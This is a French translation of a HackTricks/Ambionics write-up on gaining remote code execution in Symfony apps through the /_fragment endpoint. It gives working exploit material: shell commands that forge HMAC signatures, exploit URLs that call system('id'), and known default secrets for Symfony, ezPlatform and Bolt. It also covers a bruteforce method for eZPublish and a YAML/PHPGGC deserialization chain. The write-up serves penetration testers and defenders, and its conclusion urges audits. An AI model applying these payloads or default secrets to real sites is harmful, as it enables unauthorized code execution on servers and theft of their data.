# Symfony

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introduction <a href="#introduction" id="introduction"></a>

Depuis sa cr√©ation en 2008, l'utilisation du framework [Symfony](https://symfony.com) n'a cess√© de cro√Ætre dans les applications bas√©es sur PHP. Il est maintenant un composant central de nombreux CMS bien connus, tels que [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anciennement eZPublish), ou [Bolt](https://bolt.cm), et est souvent utilis√© pour construire des sites web personnalis√©s.

L'une des fonctionnalit√©s int√©gr√©es de Symfony, con√ßue pour g√©rer les [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), est la classe [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Essentiellement, lorsqu'une requ√™te est envoy√©e √† `/_fragment`, ce listener d√©finit les attributs de la requ√™te √† partir des param√®tres GET fournis. Puisque cela permet d'**ex√©cuter du code PHP arbitraire** (_plus de d√©tails plus tard_), la requ√™te doit √™tre sign√©e √† l'aide d'une valeur HMAC. La cl√© cryptographique secr√®te de ce HMAC est stock√©e sous une valeur de configuration Symfony nomm√©e `secret`.

Cette valeur de configuration, `secret`, est √©galement utilis√©e, par exemple, pour construire des jetons CSRF et des jetons de fonction "se souvenir de moi". √âtant donn√© son importance, cette valeur doit √©videmment √™tre tr√®s al√©atoire.

Malheureusement, nous avons d√©couvert que souvent, le secret soit a une **valeur par d√©faut**, ou qu'il existe **des moyens d'obtenir la valeur, de la forcer hors ligne, ou de contourner purement et simplement le contr√¥le de s√©curit√© auquel elle est associ√©e**. Cela affecte notamment Bolt, eZPlatform et eZPublish.

Bien que cela puisse sembler √™tre un probl√®me de configuration b√©nin, nous avons constat√© que des valeurs par d√©faut, for√ßables ou devinables sont **tr√®s, tr√®s souvent pr√©sentes** dans les CMS mentionn√©s ainsi que dans les applications personnalis√©es. Cela est principalement d√ª au fait que l'importance de cette valeur n'est pas suffisamment soulign√©e dans la documentation ou les guides d'installation.

De plus, un attaquant peut escalader des vuln√©rabilit√©s moins impactantes pour soit lire le `secret` (via une divulgation de fichier), contourner le processus de signature de `/_fragment` (en utilisant un SSRF), et m√™me le divulguer via `phpinfo()` !

Dans ce billet de blog, nous d√©crirons comment le secret peut √™tre obtenu dans divers CMS et sur le framework de base, et comment obtenir l'ex√©cution de code en utilisant ledit secret.

## Un peu d'histoire <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

√âtant un framework moderne, Symfony a d√ª g√©rer la g√©n√©ration de sous-parties d'une requ√™te depuis sa cr√©ation jusqu'√† nos jours. Avant `/_fragment`, il y avait `/_internal` et `/_proxy`, qui faisaient essentiellement la m√™me chose. Cela a produit de nombreuses vuln√©rabilit√©s au fil des ans : [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy), et [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), par exemple.

Depuis Symfony 4, le secret est g√©n√©r√© lors de l'installation, et la page `/_fragment` est d√©sactiv√©e par d√©faut. On pourrait donc penser que la conjonction d'un `secret` faible et d'un `/_fragment` activ√© serait rare. Ce n'est pas le cas : de nombreux frameworks s'appuient sur d'anciennes versions de Symfony (m√™me la version 2.x est encore tr√®s pr√©sente), et impl√©mentent soit une valeur `secret` statique, soit la g√©n√®rent de mani√®re m√©diocre. De plus, beaucoup s'appuient sur ESI et activent donc la page `/_fragment`. Aussi, comme nous le verrons, d'autres vuln√©rabilit√©s de moindre impact peuvent permettre de d√©verser le secret, m√™me s'il a √©t√© g√©n√©r√© de mani√®re s√©curis√©e.

## Ex√©cuter du code avec l'aide de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Nous allons d'abord d√©montrer comment un attaquant, ayant connaissance de la valeur de configuration `secret`, peut obtenir l'ex√©cution de code. Ceci est fait pour la derni√®re version de `symfony/http-kernel`, mais est similaire pour d'autres versions.

### Utiliser `/_fragment` pour ex√©cuter du code arbitraire <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Comme mentionn√© pr√©c√©demment, nous allons utiliser la page `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` sera ex√©cut√© √† chaque requ√™te : si le chemin de la requ√™te est `/_fragment` \[1], la m√©thode v√©rifiera d'abord que la requ√™te est valide (_c'est-√†-dire_ correctement sign√©e), et l√®vera une exception dans le cas contraire \[2]. Si les contr√¥les de s√©curit√© r√©ussissent, elle analysera le param√®tre `_path` encod√© dans l'URL, et d√©finira les attributs de `$request` en cons√©quence.

Les attributs de requ√™te ne doivent pas √™tre confondus avec les param√®tres de requ√™te HTTP : ce sont des valeurs internes, maintenues par Symfony, que l'utilisateur ne peut g√©n√©ralement pas sp√©cifier. L'un de ces attributs de requ√™te est `_controller`, qui sp√©cifie quel contr√¥leur Symfony (un tuple _(classe, m√©thode)_ ou simplement une _fonction_) doit √™tre appel√©. Les attributs dont le nom ne commence pas par `_` sont des arguments qui vont √™tre transmis au contr√¥leur. Par exemple, si nous souhaitions appeler cette m√©thode :
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
Nous d√©finirions `_path` √† :

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

La requ√™te ressemblerait alors √† ceci :

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

Essentiellement, cela permet d'appeler n'importe quelle fonction, ou n'importe quelle m√©thode de n'importe quelle classe, avec n'importe quel param√®tre. √âtant donn√© la pl√©thore de classes que Symfony poss√®de, **obtenir l'ex√©cution de code est trivial**. Nous pouvons, par exemple, appeler `system()` :

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Appeler system ne fonctionnera pas √† chaque fois : reportez-vous √† la section Exploit pour plus de d√©tails sur les subtilit√©s de l'exploitation._

Un probl√®me demeure : comment Symfony v√©rifie-t-il la signature de la requ√™te ?

### Signature de l'URL <a href="#signing-the-url" id="signing-the-url"></a>

Pour v√©rifier la signature d'une URL, un HMAC est calcul√© contre l'_URL compl√®te_. Le hash obtenu est ensuite compar√© √† celui sp√©cifi√© par l'utilisateur.

En termes de code, cela se fait en deux endroits :
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
En r√©sum√©, Symfony extrait le param√®tre GET `_hash`, puis reconstruit l'URL compl√®te, par exemple `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcule un HMAC de cette URL en utilisant le `secret` comme cl√© \[1], et le compare √† la valeur de hash donn√©e \[2]. S'ils ne correspondent pas, une exception `AccessDeniedHttpException` est lev√©e \[3], r√©sultant en une erreur `403`.

### Exemple <a href="#example" id="example"></a>

Pour tester cela, configurons un environnement de test et extrayons le secret (dans ce cas, g√©n√©r√© al√©atoirement).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Maintenant, en visitant `http://localhost:8000/_fragment`, on obtient un `403`. Essayons maintenant de fournir une signature valide :
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
En consultant `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, nous obtenons maintenant un code de statut `404`. La signature √©tait correcte, mais nous n'avons sp√©cifi√© aucun attribut de requ√™te, donc Symfony ne trouve pas notre contr√¥leur.

Puisque nous pouvons appeler n'importe quelle m√©thode, avec n'importe quel argument, nous pouvons par exemple choisir `system($command, $return_value)`, et fournir un payload comme suit :
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Nous pouvons maintenant visiter l'URL de l'exploit : `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

Malgr√© l'erreur `500`, nous pouvons voir que **notre commande a √©t√© ex√©cut√©e**.

_RCE en utilisant fragment_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Trouver des secrets <a href="#finding-secrets" id="finding-secrets"></a>

Encore une fois : tout cela ne serait pas important si les secrets n'√©taient pas accessibles. Souvent, ils le sont. Nous d√©crirons plusieurs fa√ßons d'obtenir l'ex√©cution de code sans aucune connaissance pr√©alable.

### Par le biais de vuln√©rabilit√©s <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Commen√ßons par l'√©vidence : utiliser des vuln√©rabilit√©s de moindre impact pour obtenir le secret.

#### Lecture de fichier <a href="#file-read" id="file-read"></a>

De toute √©vidence, une vuln√©rabilit√© de lecture de fichier pourrait √™tre utilis√©e pour lire les fichiers suivants et obtenir `secret` :

* `app/config/parameters.yml`
* `.env`

_Comme exemple, certaines barres d'outils de d√©bogage Symfony permettent de lire des fichiers._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

Sur les versions r√©centes de Symfony (3.x), `secret` est stock√© dans `.env` sous le nom de `APP_SECRET`. Puisqu'il est ensuite import√© comme une variable d'environnement, elles peuvent √™tre vues √† travers une page `phpinfo()`.

_Fuite de APP\_SECRET via phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Cela peut notamment √™tre fait √† travers le package profiler de Symfony, comme le d√©montre la capture d'√©cran.

#### SSRF / Usurpation d'IP (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

Le code derri√®re `FragmentListener` a √©volu√© au fil des ans : jusqu'√† la version _2.5.3_, lorsque la requ√™te provenait d'un proxy de confiance (lire : `localhost`), elle √©tait consid√©r√©e comme s√ªre, et en tant que telle, le hash n'√©tait pas v√©rifi√©. Un SSRF, par exemple, peut permettre d'ex√©cuter imm√©diatement du code, que l'on ait `secret` ou non. Cela affecte notamment eZPublish jusqu'√† 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
### √Ä travers les valeurs par d√©faut <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43 : `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Lors de la configuration d'un site Symfony, la premi√®re √©tape consiste √† installer le squelette [symfony-standard](https://github.com/symfony/symfony-standard). Une fois install√©, une invite demande certaines valeurs de configuration. Par d√©faut, la cl√© est `ThisTokenIsNotSoSecretChangeIt`.

_Installation de Symfony via composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

Dans les versions ult√©rieures (4+), la cl√© secr√®te est g√©n√©r√©e de mani√®re s√©curis√©e.

#### ezPlatform 3.x (derni√®re version) : `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), le successeur de [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), utilise toujours Symfony. Le 10 juin 2019, un [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) a d√©fini la cl√© par d√©faut √† `ff6dc61a329dc96652bb092ec58981f7`. Les versions vuln√©rables vont de 3.0-alpha1 √† 3.1.1 (actuelle).

Bien que la [documentation](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) indique que le secret doit √™tre chang√©, cela n'est pas impos√©.

#### ezPlatform 2.x : `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Comme pour le squelette de Symfony, on vous demandera de saisir un secret lors de l'installation. La valeur par d√©faut est `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (derni√®re version) : `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) utilise [Silex](https://github.com/silexphp/Silex), un micro-framework obsol√®te bas√© sur Symfony. Il configure la cl√© secr√®te en utilisant ce calcul :
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Ainsi, on peut deviner le secret, ou utiliser une vuln√©rabilit√© de Full Path Disclosure pour le calculer.

Si vous n'avez pas r√©ussi avec les cl√©s secr√®tes par d√©faut, ne d√©sesp√©rez pas : il existe d'autres m√©thodes.

### Bruteforce <a href="#bruteforce" id="bruteforce"></a>

Comme le secret est souvent d√©fini manuellement (au lieu d'√™tre g√©n√©r√© al√©atoirement), les gens utilisent souvent une phrase secr√®te au lieu d'une valeur al√©atoire s√©curis√©e, ce qui le rend vuln√©rable au bruteforce si nous avons un hash contre lequel effectuer le bruteforce. √âvidemment, une URL valide `/_fragment`, comme celle g√©n√©r√©e par Symfony, nous fournirait un tuple message-hash valide pour bruteforcer le secret.

_Une requ√™te valide au fragment est incluse dans la r√©ponse_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

Au d√©but de cet article de blog, nous avons dit que le secret de Symfony avait plusieurs utilisations. L'une d'elles est qu'il est √©galement utilis√© pour g√©n√©rer des tokens CSRF. Une autre utilisation de `secret` est de signer les cookies remember-me. Dans certains cas, un attaquant peut utiliser son propre token CSRF ou cookie remember-me pour bruteforcer la valeur de `secret`.

_L'ing√©nierie inverse de la construction de ces tokens est laiss√©e comme exercice au lecteur._

### Aller plus loin : eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

Comme exemple de la fa√ßon dont les secrets peuvent √™tre bruteforc√©s pour obtenir une ex√©cution de code, nous verrons comment nous pouvons d√©couvrir le secret d'eZPublish 2014.07.

#### Trouver du mat√©riel pour bruteforce <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish g√©n√®re ses tokens CSRF de cette mani√®re :
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Pour construire ce jeton, eZP utilise deux valeurs que nous connaissons, et le secret : `getIntention()` est l'action que l'utilisateur tente de r√©aliser (par exemple `authenticate`), `session_id()` est l'ID de session PHP, et `getSecret()`, eh bien, est le `secret` de Symfony.

Puisque les jetons CSRF peuvent √™tre trouv√©s sur certains formulaires, nous avons maintenant le mat√©riel pour forcer brutalement le secret.

Malheureusement, ezPublish a int√©gr√© un bundle de sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Ce package s'assure que la cl√© secr√®te est al√©atoire. Il la g√©n√®re de cette mani√®re, lors de l'installation :
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
Cela semble tr√®s difficile √† forcer par bruteforce : `mt_rand()` peut produire 2^31 valeurs diff√©rentes, et `uniqid()` est construit √† partir de l'horodatage actuel (avec microsecondes).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Divulgation du timestamp <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Heureusement, nous savons que ce secret est g√©n√©r√© lors de la derni√®re √©tape de l'installation, juste apr√®s la configuration du site web. Cela signifie que nous pouvons probablement divulguer le timestamp utilis√© pour g√©n√©rer ce hash.

Une mani√®re de faire est d'utiliser les logs (_par exemple_ `/var/log/storage.log`); on peut divulguer la premi√®re fois qu'une entr√©e de cache a √©t√© cr√©√©e. L'entr√©e de cache est cr√©√©e juste apr√®s l'appel √† `generateRandomSecret()`.

_Contenu d'exemple de log : le timestamp est similaire √† celui utilis√© pour calculer le secret_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Si les logs ne sont pas disponibles, on peut utiliser le moteur de recherche tr√®s puissant d'eZPublish pour trouver le moment de cr√©ation du tout premier √©l√©ment du site web. En effet, lors de la cr√©ation du site, de nombreux timestamps sont ins√©r√©s dans la base de donn√©es. Cela signifie que le timestamp des donn√©es initiales du site eZPublish est le m√™me que celui utilis√© pour calculer `uniqid()`. Nous pouvons rechercher l'objet _ContentObject_ `landing_page` et d√©couvrir son timestamp.

## For√ßage brutal des bits manquants <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Nous connaissons maintenant le timestamp utilis√© pour calculer le secret, ainsi qu'un hash de la forme suivante :
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Cela nous laisse avec un total de 231 \* 106 possibilit√©s. Cela semble faisable avec [hashcat](https://hashcat.net) et un bon ensemble de GPU, mais hashcat ne fournit pas de noyau `sha1(sha1($pass).$salt)`. Heureusement, nous l'avons impl√©ment√© ! Vous pouvez trouver [la pull-request ici](https://github.com/hashcat/hashcat/pull/2536).

En utilisant notre machine de cracking, qui dispose de 8 GPU, nous pouvons craquer ce hash en _moins de 20 heures_.

Apr√®s avoir obtenu le hash, nous pouvons utiliser `/_fragment` pour ex√©cuter du code.

## Conclusion <a href="#conclusion" id="conclusion"></a>

Symfony est maintenant un composant central de nombreuses applications PHP. En tant que tel, tout risque de s√©curit√© qui affecte le framework affecte de nombreux sites web. Comme d√©montr√© dans cet article, soit un secret faible soit une vuln√©rabilit√© de moindre impact permet aux attaquants d'obtenir une **ex√©cution de code √† distance**.

En tant que membre d'une √©quipe bleue, vous devriez examiner chacun de vos sites web d√©pendant de Symfony. Un logiciel √† jour ne peut √™tre exclu pour les vuln√©rabilit√©s, car la cl√© secr√®te est g√©n√©r√©e lors de la premi√®re installation du produit. Par cons√©quent, si vous avez cr√©√© un site web bas√© sur Symfony-3.x il y a quelques ann√©es, et que vous l'avez maintenu √† jour en cours de route, il y a des chances que la cl√© secr√®te soit toujours celle par d√©faut.

## Exploitation <a href="#exploitation" id="exploitation"></a>

### Th√©orie <a href="#theory" id="theory"></a>

D'une part, nous avons quelques pr√©occupations lors de l'exploitation de cette vuln√©rabilit√© :

* Le HMAC est calcul√© en utilisant l'**URL compl√®te**. Si le site web est derri√®re un proxy inverse, nous devons utiliser l'URL interne du service au lieu de celle √† laquelle nous envoyons notre charge utile. Par exemple, l'URL interne pourrait √™tre en HTTP au lieu de HTTPS.
* L'algorithme du HMAC a chang√© au fil des ans : c'√©tait **SHA-1** avant, et c'est maintenant **SHA-256**.
* Comme Symfony supprime le param√®tre `_hash` de la requ√™te, puis g√©n√®re √† nouveau l'URL, nous devons calculer le hash sur la m√™me URL que lui.
* Beaucoup de secrets peuvent √™tre utilis√©s, donc nous devons tous les v√©rifier.
* Sur certaines versions de PHP, nous ne pouvons pas appeler des fonctions qui ont des param√®tres "par r√©f√©rence", comme `system($command, &$return_value)`.
* Sur certaines versions de Symfony, `_controller` ne peut pas √™tre une fonction, cela doit √™tre une m√©thode. Nous devons trouver une m√©thode Symfony qui nous permet d'ex√©cuter du code.

D'autre part, nous pouvons tirer avantage de quelques points :

* Atteindre `/_fragment` sans param√®tres, ou avec un hash invalide, devrait retourner un `403`.
* Atteindre `/_fragment` avec un hash valide mais sans un contr√¥leur valide devrait produire un `500`.

Le dernier point nous permet de tester des valeurs secr√®tes sans nous soucier de quelle fonction ou m√©thode nous allons appeler par la suite.

### Pratique <a href="#practice" id="practice"></a>

Disons que nous attaquons `https://target.com/_fragment`. Pour pouvoir signer correctement une URL, nous avons besoin de conna√Ætre :

* URL interne : cela pourrait √™tre `https://target.com/_fragment`, ou peut-√™tre `http://target.com/_fragment`, ou quelque chose de compl√®tement diff√©rent (_par exemple_ `http://target.website.internal`), ce que nous ne pouvons pas deviner
* Cl√© secr√®te : nous avons une liste de cl√©s secr√®tes habituelles, telles que `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algorithme : SHA1 ou SHA256

Nous n'avons pas besoin de nous pr√©occuper de la charge utile effective (le contenu de `_path`) pour l'instant, car une URL correctement sign√©e ne r√©sultera pas en un `AccessDeniedHttpException` lanc√©, et donc ne produira pas un `403`. L'exploit essaiera donc chaque combinaison `(algorithme, URL, secret)`, g√©n√©rera une URL et v√©rifiera si elle ne produit pas un code de statut `403`.

_Une requ√™te valide √† `/_fragment`, sans param√®tre `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

√Ä ce stade, nous pouvons signer n'importe quelle URL `/_fragment`, ce qui signifie que c'est un RCE garanti. Il s'agit juste de savoir quoi appeler.

Ensuite, nous devons d√©terminer si nous pouvons appeler une fonction directement, ou si nous devons utiliser une m√©thode de classe. Nous pouvons d'abord essayer la premi√®re mani√®re, la plus directe, en utilisant une fonction telle que `phpinfo ([ int $what = INFO_ALL ] )` ([documentation](https://www.php.net/manual/en/function.phpinfo.php)). Le param√®tre GET `_path` ressemblerait √† ceci :
```
_controller=phpinfo
&what=-1
```
Et l'URL ressemblerait √† ceci :

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Si la r√©ponse HTTP affiche une page `phpinfo()`, nous avons gagn√©. Nous pouvons ensuite essayer d'utiliser une autre fonction, telle que `assert` :

_Exemple de sortie en utilisant `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

Sinon, cela signifie que nous devrons utiliser une m√©thode de classe √† la place. Un bon candidat pour cela est `Symfony\Component\Yaml\Inline::parse`, qui est une classe int√©gr√©e de Symfony, et en tant que telle est pr√©sente sur les sites web Symfony.

De toute √©vidence, cette m√©thode analyse une cha√Æne d'entr√©e YAML. Le parseur [YAML](https://yaml.org) de Symfony prend en charge la balise `php/object`, qui convertira une cha√Æne d'entr√©e s√©rialis√©e en un objet en utilisant `unserialize()`. Cela nous permet d'utiliser notre outil PHP favori, [PHPGGC](https://github.com/ambionics/phpggc) !

Le prototype de la m√©thode a chang√© au fil des ans. Par exemple, voici trois prototypes diff√©rents :
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
Au lieu de construire `_path` pour chacun de ces √©l√©ments, nous pouvons tirer parti du fait que si nous donnons un argument dont le nom ne correspond pas au prototype de la m√©thode, il sera ignor√©. Nous pouvons donc ajouter tous les arguments possibles √† la m√©thode, sans nous soucier du prototype r√©el.

Nous pouvons donc construire `_path` de cette mani√®re :
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
```markdown
Encore une fois, nous pouvons essayer avec `phpinfo()`, et voir si cela fonctionne. Si c'est le cas, nous pouvons utiliser `system()` √† la place.

_Exemple de sortie en utilisant `Inline::parse` avec une charge utile s√©rialis√©e_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

L'exploit va donc tester toutes les combinaisons de variables possibles, puis essayer les deux m√©thodes d'exploitation. Le code est disponible sur [notre GitHub](https://github.com/ambionics/symfony-exploits).

## Acc√®s aux informations symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Comme vous pouvez le voir dans la capture d'√©cran ci-dessus, il y a un logo `sf` en bas √† droite de la page. Ce logo appara√Æt lorsque Symfony est en mode d√©bogage. Il y a des cas o√π ce logo n'appara√Æt pas, donc essayez d'acc√©der √† `/_profiler` et vous verrez la page comme ci-dessous

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

